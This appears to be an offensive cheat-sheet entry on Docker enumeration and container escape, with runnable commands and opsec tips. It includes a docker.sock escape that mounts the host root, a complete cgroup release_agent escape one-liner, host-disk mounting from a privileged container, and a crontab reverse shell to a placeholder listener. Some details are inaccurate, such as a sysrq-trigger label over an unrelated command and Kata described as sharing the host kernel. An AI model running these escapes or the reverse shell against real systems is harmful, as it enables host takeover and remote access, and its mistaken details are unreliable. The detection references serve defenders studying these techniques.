docker_enum.description: Enumerating Docker environments from inside and outside containers.

commands.description: Check if running inside a container.
commands.command: cat /proc/1/cgroup | grep -i docker; ls -la /.dockerenv 2>/dev/null; cat /proc/self/mountinfo | grep -i docker

commands.description: List all running containers.
commands.command: docker ps -a --format 'table {{.ID}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}'

commands.description: List Docker networks.
commands.command: docker network ls && docker network inspect bridge

commands.description: Inspect container for environment variables and secrets.
commands.command: docker inspect {container_id} | jq '.[].Config.Env, .[].Mounts'

commands.description: Check for exposed Docker socket from inside container.
commands.command: ls -la /var/run/docker.sock && curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

docker_enum.prerequisites: Shell access inside a container; Docker socket or container runtime accessible
docker_enum.opsec: Docker socket access (/var/run/docker.sock) grants full container control. Enumerate environment variables, mounted secrets first — no tools needed.
docker_enum.detection_ref: Falco rules for docker.sock access; runtime security monitoring; container process anomalies

docker_escape.description: Escaping Docker containers to compromise the host system.

commands.description: Escape via exposed Docker socket — spawn privileged container.
commands.command: docker -H unix:///var/run/docker.sock run -it --rm --privileged --pid=host --network=host --volume /:/host alpine chroot /host bash

commands.description: Privileged container escape via /proc/sysrq-trigger.
commands.command: # In privileged container:\nfdisk -l; mkdir /tmp/host; mount /dev/{host_disk} /tmp/host; chroot /tmp/host bash

commands.description: Container escape via cgroup release_agent (CVE-2022-0492). Note: cgroup v1 release_agent escape is mitigated on kernel 5.2+ (cgroupv2) and systems with Seccomp/AppArmor. Verify with: cat /proc/1/cgroup. Fall back to runc CVE-2019-5736 or privileged socket mount on patched kernels.
commands.command: mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab) && echo "$host_path/cmd" > /tmp/cgrp/release_agent && echo '#!/bin/sh' > /cmd && echo "id > $host_path/output" >> /cmd && chmod a+x /cmd && sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

commands.description: Escape via writable hostPath volume mount.
commands.command: # If /host or similar hostPath is mounted read-write:\necho '* * * * * root bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' >> /host/etc/crontab

commands.description: runc escape (CVE-2019-5736).
commands.command: # Overwrite host runc binary via /proc/self/exe symlink from inside container

commands.description: Escape via kernel exploit (requires privileged caps).
commands.command: # Check capabilities: capsh --print\n# If CAP_SYS_ADMIN present — use DirtyCow or similar kernel exploit

commands.description: Leaky Vessels runc escape (CVE-2024-21626) — working directory file descriptor leak.
commands.command: # Affects runc < 1.1.12: set container working dir to /proc/self/fd/7 (leaked host fd) to access host filesystem from inside container

commands.description: Kata Containers bypass via shared kernel with CAP_SYS_PTRACE.
commands.command: # If running in Kata with CAP_SYS_PTRACE: use ptrace to attach to host process via shared /proc namespace

docker_escape.prerequisites: Privileged container; CAP_SYS_ADMIN; Docker socket mounted; or shared PID namespace
docker_escape.opsec: Privileged escape via /proc/1/root or cgroup notify is fast and reliable. Cgroup v1 approach leaves traces in kernel audit log.
docker_escape.detection_ref: Falco container escape detection; seccomp/AppArmor profiles; Pod Security Standards enforcement; Sysdig for runtime anomalies
